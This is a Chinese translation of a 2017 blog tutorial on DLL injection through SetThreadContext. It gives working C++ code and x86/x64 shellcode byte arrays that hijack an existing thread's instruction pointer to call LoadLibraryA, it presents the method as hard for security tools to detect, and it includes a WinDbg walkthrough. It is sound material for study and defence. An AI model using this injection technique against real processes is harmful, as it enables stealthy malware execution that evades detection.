# 【技术分享】Dll注入新姿势：SetThreadContext注入

阅读量 **359146**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-09-07 15:10:38

 **x**

##### 译文声明

本文是翻译文章，文章来源：microsoft.co.il

原文地址：<https://blogs.microsoft.co.il/pavely/2017/09/05/dll-injection-with-setthreadcontext/>

译文仅供参考，具体内容表达以及含义原文为准。

译者：[blueSky](http://bobao.360.cn/member/contribute?uid=1233662000)

预估稿费：190RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**前言**

目前，有多种方法可用于将DLL注入到进程中，但每个都有其优点和缺点。在这些方法中，最简单的是使用[
**CreateRemoteThread**](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682437\(v=vs.85\).aspx)函数在目标进程中创建一个新线程，并将线程的启动函数指向
**LoadLibrary**
函数。这种方法最容易实现，但也是最容易被检测到，因为可以通过多种方式“感知”到创建的新线程，例如使用ETW事件。如果系统中存在一个驱动程序，并且该驱动程序正在hooking使用[
**PsSetCreateThreadNotifyRoutine**](https://msdn.microsoft.com/library/windows/hardware/ff559954)创建的线程，那么该行为自然会被安全检测工具识别到。

一种隐蔽的方法是使用现有的线程来执行DLL注入，其中一种方法是使用[APC](http://blogs.microsoft.co.il/pavely/2017/03/14/injecting-a-dll-without-a-remote-thread/)通过[调用QueueUserApc](https://msdn.microsoft.com/EN-US/library/windows/desktop/ms684954\(v=vs.85\).aspx) 将APC附加到目标进程的线程队列中去，并使用
**APC**
调用LoadLibrary函数。使用APC执行DLL注入存在的问题是被注入线程必须进入可唤醒状态才能“处理”APC并执行我们的LoadLibrary调用，但要保证一个线程永远处于可唤醒状态是很困难的。为了增加成功的机会，可以向指定进程的每一个线程都插入一个APC，但这种做法在某些情况下是不起作用的。一个典型的例子就是
**cmd.exe** ，据我所知其单线程从不进入可唤醒状态。

这篇文章将阐述另一种使目标进程调用 **LoadLibrary**
函数的方法，但这次我们将通过操作现有线程的上下文来执行DLL注入，线程的指令指针被转移到一个自定义的代码段，然后被重定向回来。这种方法很难检测，因为这些操作看起来就像是一个正常线程正在做的事情，下面让我来阐述如何在x86和x64平台中完成这种DLL注入。

  

**DLL注入**

****

首先，我们需要做的第一件事就是找到一个目标进程并在该进程中选择一个线程，从技术上来讲，它可以是目标进程中的任何线程，但是一个处于“等待”状态的线程将不会运行我们的代码，所以最好还是选择一个正在运行或可能马上就要运行的线程来尽可能早地加载我们的DLL。一旦我们选定了进程中的目标线程，那么可以使用下面的代码来访问它们：

    
    
    //
    // open handle to process
    //
    auto hProcess = ::OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess)
        return Error("Failed to open process handle");
    //
    // open handle to thread
    //    
    auto hThread = ::OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT, FALSE, tid);
    if (!hThread)
        return Error("Failed to open thread handle");

对于进程，由于我们将在进程中编写目标代码，因此我们在打开进程的函数中使用了 **PROCESS_VM_OPERATION** 和
**PROCESS_VM_WRITE**
这两个参数。对于线程，由于我们需要改变它的上下文，因此我们需要在改变其上下文的时候使它处于“悬挂”状态。这种DLL注入方法需要几个步骤：

首先，由于我们的代码需要在进程中执行，因此我们在目标进程中分配内存：

    
    
    const auto page_size = 1 << 12;
    auto buffer = static_cast<char*>(::VirtualAllocEx(hProcess, nullptr, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));

在上述的代码中我们分配一整页RWX内存，实际上并不需要这么大的内存空间，但是内存管理器是以页为单位来分配内存空间，因此我们可以分配到一个完整的内存页面。我们使用下面的代码使线程处于“悬挂”状态，然后捕获执行线程的上下文：

    
    
    if (::SuspendThread(hThread) == -1)
        return false;
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    if (!::GetThreadContext(hThread, &context))
        return false;

接下来，我们需要在目标进程中添加一些代码，这些代码必须使用汇编语言来写，并且必须与目标进程的bitness匹配（在任何情况下，注入的DLL必须与目标进程的bitness匹配）。对于x86而言，我们可以在Visual
Studio中编写以下内容，并复制生成的汇编代码：

    
    
    void __declspec(naked) InjectedFunction() {
        __asm {
            pushad
            push        11111111h   ; the DLL path argument 
            mov         eax, 22222222h  ; the LoadLibraryA function address
            call        eax
            popad
            push        33333333h   ; the code to return to
            ret
        }
    }

该函数使用[ **__declspe** c(naked)](https://docs.microsoft.com/en-us/cpp/cpp/naked-cpp)属性进行修饰， **该属性用来告诉编译器函数代码中的汇编语言是我们自己写的，不需要编译器添加任何汇编代码**
。在将代码添加到目标进程之前，我们需要修改代码中的的占位符。在这个演示的源代码中，我将所生成的机器代码转换成一个字节数组，如下所示：

    
    
    BYTE code[] = {
        0x60,
        0x68, 0x11, 0x11, 0x11, 0x11,
        0xb8, 0x22, 0x22, 0x22, 0x22,
        0xff, 0xd0,
        0x61,
        0x68, 0x33, 0x33, 0x33, 0x33,
        0xc3
    };

字节数组对应于上述的指令，现在我们修改虚拟地址：

    
    
    auto loadLibraryAddress = ::GetProcAddress(::GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    // set dll path
    *reinterpret_cast<PVOID*>(code + 2) = static_cast<void*>(buffer + page_size / 2);    
    // set LoadLibraryA address
    *reinterpret_cast<PVOID*>(code + 7) = static_cast<void*>(loadLibraryAddress);
    // jump address (back to the original code)
    *reinterpret_cast<unsigned*>(code + 0xf) = context.Eip;

首先，我们得到 **LoadLibraryA** 的地址，因为这是我们用来在目标地址中加载DLL的函数。 **LoadLibraryW**
也可以正常工作，但是ASCII版本的使用更简单一些。 接下来，我们将修改后的代码和DLL路径写入目标进程：

    
    
    //
    // copy the injected function into the buffer
    //
    if (!::WriteProcessMemory(hProcess, buffer, code, sizeof(code), nullptr))
        return false;
    //
    // copy the DLL name into the buffer
    //
    if (!::WriteProcessMemory(hProcess, buffer + page_size / 2, dllPath, ::strlen(dllPath) + 1, nullptr))
        return false;
    最后一件事是将新的指令指针指向添加的代码并恢复线程执行：
    context.Eip = reinterpret_cast<DWORD>(buffer);
    if (!::SetThreadContext(hThread, &context))
        return false;
    ::ResumeThread(hThread);

下面我们将以32位版本的DLL注入为例来阐述如何使用调试工具来调试我们注入的进程。首先，我们需要附加到目标进程中去，并跟随目标中的代码执行流程。在以下示例中，我从
**WindowsSysWow64**
目录（在64位系统上）启动了32位版本的记事本。在演示项目（地址见文章末尾处）中，命令行程序允许设置目标进程ID和要注入的DLL的路径，这里我已经在Visual
Studio设置过了，并在调用[SetThreadContext](https://msdn.microsoft.com/EN-US/library/windows/desktop/ms680632\(v=vs.85\).aspx)之前放置了一个断点，控制台窗口显示了将代码复制到的虚拟地址，具体如下图所示：

现在我们可以将WinDbg附加到记事本进程，并查看该地址上的代码：

    
    
    0:005> u 04A00000
    04a00000 60              pushad
    04a00001 680008a004      push    4A00800h
    04a00006 b8805a3b76      mov     eax,offset KERNEL32!LoadLibraryAStub (763b5a80)
    04a0000b ffd0            call    eax
    04a0000d 61              popad
    04a0000e 685c29e476      push    offset win32u!NtUserGetMessage+0xc (76e4295c)
    04a00013 c3              ret

我们可以清楚地看到我们修改的代码，其中调用了 **LoadLibraryA** 函数，然后代码恢复到 **NtUserGetMessage**
函数内的某个位置，我们甚至可以在04A00000地址处设置一个断点，如下所示：

    
    
    bp 04A00000

现在我们可以让记事本程序继续执行，但我们设置了一个断点，以下是断点和调用堆栈的详细信息：

    
    
    Breakpoint 0 hit
    eax=00000001 ebx=01030000 ecx=00000000 edx=00000000 esi=0093fbe4 edi=01030000
    eip=04a00000 esp=0093fba0 ebp=0093fbb8 iopl=0         nv up ei pl nz ac pe nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
    04a00000 60              pushad
    0:000> k
     # ChildEBP RetAddr  
    WARNING: Frame IP not in any known module. Following frames may be wrong.
    00 0093fb9c 7570fecc 0x4a00000
    01 0093fbb8 01037219 USER32!GetMessageW+0x2c
    02 0093fc38 0104b75c notepad!WinMain+0x18e
    03 0093fccc 763b8744 notepad!__mainCRTStartup+0x142
    04 0093fce0 7711582d KERNEL32!BaseThreadInitThunk+0x24
    05 0093fd28 771157fd ntdll!__RtlUserThreadStart+0x2f
    06 0093fd38 00000000 ntdll!_RtlUserThreadStart+0x1b

我们可以一步一步地调试 notepad，但也可以让 notepad进程去加载我们的DLL，一旦DllMain被调用，我们就可以做任何事情了：

以下是我在64位机器上测试使用的代码，但我并不能保证该段代码在任何情况下都可以正常运行，因此该代码还需要进行更多测试：

    
    
    BYTE code[] = {
        // sub rsp, 28h
        0x48, 0x83, 0xec, 0x28,                           
        // mov [rsp + 18], rax
        0x48, 0x89, 0x44, 0x24, 0x18,                     
        // mov [rsp + 10h], rcx
        0x48, 0x89, 0x4c, 0x24, 0x10,
        // mov rcx, 11111111111111111h
        0x48, 0xb9, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,     
        // mov rax, 22222222222222222h
        0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
        // call rax
        0xff, 0xd0,
        // mov rcx, [rsp + 10h]
        0x48, 0x8b, 0x4c, 0x24, 0x10,
        // mov rax, [rsp + 18h]
        0x48, 0x8b, 0x44, 0x24, 0x18,
        // add rsp, 28h
        0x48, 0x83, 0xc4, 0x28,
        // mov r11, 333333333333333333h
        0x49, 0xbb, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,
        // jmp r11
        0x41, 0xff, 0xe3
    };

X64版本的代码看起来与x86版本不同，因为x64中的调用约定与x86 **__stdcall**
不同。例如，前四个整数参数在RCX，RDX，R8和R9中传递，而不是堆栈。在我们的例子中，
由于LoadLibraryA函数只需要一个参数即可，因此一个RCX就足够了。

对代码的修改自然需要使用不同的偏移量：

    
    
    // set dll path
    *reinterpret_cast<PVOID*>(code + 0x10) = static_cast<void*>(buffer + page_size / 2);
    // set LoadLibraryA address
    *reinterpret_cast<PVOID*>(code + 0x1a) = static_cast<void*>(loadLibraryAddress);
    // jump address (back to the original code)
    *reinterpret_cast<unsigned long long*>(code + 0x34) = context.Rip;

**总结**

****

本文讲述了一种通过改变线程上下文来执行DLL注入的一种方法，由于加载DLL是一件很寻常的事件，因此这种方法很难被检测到。一种可能的方法是定位可执行页面并将其地址与已知模块进行比较，但是注入进程会在DLL注入完成后释放注入函数的内存，因此定位可执行页面也是非常困难的。

文中涉及到的代码可以在我的Github仓库中找到 ：

<https://github.com/zodiacon/DllInjectionWithThreadContext>

本文翻译自microsoft.co.il
[原文链接](https://blogs.microsoft.co.il/pavely/2017/09/05/dll-injection-with-setthreadcontext/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **blueSky** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86786](/post/id/86786)

安全客 - 有思想的安全新媒体

本文转载自: [microsoft.co.il](https://blogs.microsoft.co.il/pavely/2017/09/05/dll-injection-with-setthreadcontext/)

如若转载,请注明出处： <https://blogs.microsoft.co.il/pavely/2017/09/05/dll-injection-with-setthreadcontext/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __4赞

 __收藏

![](https://p4.ssl.qhmsg.com/dm/200_200_100/t01d4c6d0183e5e3280.jpg) blueSky

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

